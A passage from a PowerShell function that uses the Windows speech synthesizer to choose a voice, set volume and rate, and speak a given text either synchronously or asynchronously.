            $Voice = "Microsoft $V Desktop"
            }
        Else{$voice=$SpeechSynth.GetInstalledVoices().VoiceInfo.name[0]}
        # Adjust voice settings
        $SpeechSynth.SelectVoice($Voice)
        $SpeechSynth.volume=$Volume
        $SpeechSynth.Rate=$Rate
        }
    Process{
        # if -Async
        if($Async){$SpeechSynth.SpeakAsync($Speech) | Out-Null}
        # else
        else{$SpeechSynth.Speak($Speech) | out-null}
        }
    End{}
    }
